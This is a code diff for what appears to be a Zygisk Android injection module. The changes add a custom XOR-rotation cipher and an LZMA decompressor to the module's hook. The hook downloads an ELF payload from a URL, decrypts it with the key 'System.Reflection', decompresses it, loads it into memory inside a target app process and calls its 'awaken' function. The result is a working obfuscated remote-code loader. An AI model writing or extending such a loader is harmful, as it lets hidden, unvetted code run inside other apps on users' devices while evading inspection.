@@ -23,10 +23,13 @@
 #include <string>
 #include <cstdlib>
 #include <ctime>
+#include <openssl/aes.h>
 #include "Includes/obfuscate.h"
+#include "lzma.h"
 #include "URL.h"
 #include "zygisk.hpp"
 
+// Define LDEBUG Only for Debugging!
 #define LDEBUG
 
 #include "log.h"
@@ -41,6 +44,19 @@
 #define Elf_Shdr Elf32_Shdr
 #define Elf_Sym  Elf32_Sym
 #endif
+
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <cstring>
+#include <openssl/aes.h>
+#include <elf.h>
+
+using zygisk::Api;
+using zygisk::AppSpecializeArgs;
+using zygisk::ServerSpecializeArgs;
+
+bool proc_stat = false;
 
 bool contains(std::string in, std::string target) {
     if(strstr(in.c_str(), target.c_str())) {
@@ -83,12 +99,6 @@ std::string get_url(const char* site) {
     return datastr;
 }
 
-using zygisk::Api;
-using zygisk::AppSpecializeArgs;
-using zygisk::ServerSpecializeArgs;
-
-bool proc_stat = false;
-
 size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
     std::vector<char> *data = static_cast<std::vector<char>*>(userp);
     size_t total_size = size * nmemb;
@@ -108,6 +118,70 @@ bool get_file(const char *site, std::vector<char> &elf_data) {
     CURLcode res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
     return (res == CURLE_OK);
+}
+
+bool decompress_lzma(const std::vector<char>& input_data, std::vector<char>& output_data) {
+    LOGI("Starting LZMA decompression...");
+    lzma_stream strm = LZMA_STREAM_INIT;
+    lzma_ret ret = lzma_auto_decoder(&strm, (12 * 1024 * 1024), 0);
+    if (ret != LZMA_OK) {
+        LOGE("Error initializing decoder: %d", ret);
+        return false;
+    }
+    strm.next_in = reinterpret_cast<const uint8_t*>(input_data.data());
+    strm.avail_in = input_data.size();
+    LOGD("Input data size: %zu bytes", input_data.size());
+    output_data.resize(input_data.size() * 2);
+    strm.next_out = reinterpret_cast<uint8_t*>(output_data.data());
+    strm.avail_out = output_data.size();
+    LOGD("Allocated output buffer size: %zu bytes", output_data.size());
+    while (strm.avail_in > 0) {
+        ret = lzma_code(&strm, LZMA_RUN);
+        if (ret == LZMA_OK || ret == LZMA_STREAM_END) {
+            LOGD("Processed: %zu bytes, Decompressed: %zu bytes.", strm.avail_in, strm.avail_out);
+        } else {
+            LOGE("Error during decompression: Return code %d", ret);
+            lzma_end(&strm);
+            return false;
+        }
+        if (strm.avail_out == 0) {
+            size_t old_size = output_data.size();
+            output_data.resize(old_size * 2);
+            strm.next_out = reinterpret_cast<uint8_t*>(output_data.data() + old_size);
+            strm.avail_out = output_data.size() - old_size;
+        }
+    }
+    if (ret != LZMA_STREAM_END) {
+        LOGE("Decompression did not complete correctly. Return code: %d", ret);
+        lzma_end(&strm);
+        return false;
+    }
+    output_data.resize(strm.total_out);
+    LOGD("Decompression complete. Total decompressed data size: %zu bytes.", strm.total_out);
+    lzma_end(&strm);
+    LOGI("LZMA decompression finished successfully.");
+    return true;
+}
+
+void xor_cipher(std::vector<char>& data, const std::string& key, bool mode) {
+    uint32_t key1 = 0x1EFF2FE1, key2 = 0x1E00A2E3;
+    for (char c : key) {
+        key1 = (key1 * 33) ^ static_cast<uint8_t>(c);
+        key2 = (key2 * 31) + static_cast<uint8_t>(c);
+    }
+    for (size_t i = 0; i < data.size(); ++i) {
+        if (mode) { // Encrypt
+            data[i] = (data[i] << 3) | (data[i] >> 5);
+            data[i] ^= static_cast<uint8_t>(key1 >> (i % 32));
+            data[i] = (data[i] >> 2) | (data[i] << 6);
+            data[i] ^= static_cast<uint8_t>(key2 >> ((i + 5) % 32));
+        } else { // Decrypt
+            data[i] ^= static_cast<uint8_t>(key2 >> ((i + 5) % 32));
+            data[i] = (data[i] << 2) | (data[i] >> 6);
+            data[i] ^= static_cast<uint8_t>(key1 >> (i % 32));
+            data[i] = (data[i] >> 3) | (data[i] << 5);
+        }
+    }
 }
 
 size_t get_random_mem_size(size_t base_size) {
@@ -170,7 +244,7 @@ ELFObject load_elf_from_memory(void *elf_mem, size_t size) {
     ELFObject obj = {0};
     obj.ehdr = (Elf64_Ehdr *)elf_mem;
     if (memcmp(obj.ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
-        LOGE("Invalid ELF header");
+        LOGE("Invalid ELF");
     }
     obj.phdr = (Elf64_Phdr *)((char *)obj.ehdr + obj.ehdr->e_phoff);
     LOGI("ELF program headers loaded, count: %d", obj.ehdr->e_phnum);
@@ -408,15 +482,21 @@ public:
         if (proc_stat) {
             std::vector<char> elf_data;
             if (!get_file(durl, elf_data)) {
-                LOGE("Failed to download ELF file.");
+                LOGE("Failed to fetch ELF.");
+                return;
             }
-            LOGE("Got ELF bytes, size: %zu", elf_data.size());
-            ELFObject elf_base = load_elf_from_memory(elf_data.data(), elf_data.size());
+            xor_cipher(elf_data, "System.Reflection", false);
+            std::vector<char> new_elf_data;
+            decompress_lzma(elf_data, new_elf_data);
+            LOGE("Got ELF bytes, size: %zu", new_elf_data.size());
+            ELFObject elf_base = load_elf_from_memory(new_elf_data.data(), new_elf_data.size());
             if (!elf_base.base) {
                 LOGE("Failed to load ELF data.");
             }
             elf_data.clear();
             elf_data.shrink_to_fit();
+            new_elf_data.clear();
+            new_elf_data.shrink_to_fit();
             LOGD("ELF successfully loaded at %p", elf_base.base);
             void* awakenptr = resolve_symbol("_Z6awakenv", elf_base);
             LOGI("Calling _Z6awakenv: %p", awakenptr);
